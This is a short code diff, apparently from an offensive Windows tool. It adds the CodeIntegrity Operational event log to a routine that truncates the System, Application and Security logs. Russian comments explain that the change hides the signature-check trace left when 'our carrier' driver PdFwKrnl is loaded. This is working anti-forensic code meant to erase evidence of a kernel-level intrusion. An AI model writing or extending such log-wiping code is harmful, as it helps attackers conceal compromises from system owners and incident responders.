@@ -567,8 +567,12 @@ static void ScDoEventLogs() {
         L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
         L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
         L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
+        // CodeIntegrity Operational: сюда пишется верификация подписи драйвера
+        // при загрузке (наш носитель PdFwKrnl). Ключевой след для драйверной
+        // очистки — без него загрузка носителя видна.
+        L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-CodeIntegrity%4Operational.evtx",
     };
-    for (int i = 0; i < 3; ++i)
+    for (int i = 0; i < 4; ++i)
         KrTruncateEvtx(logs[i]);
 }
 
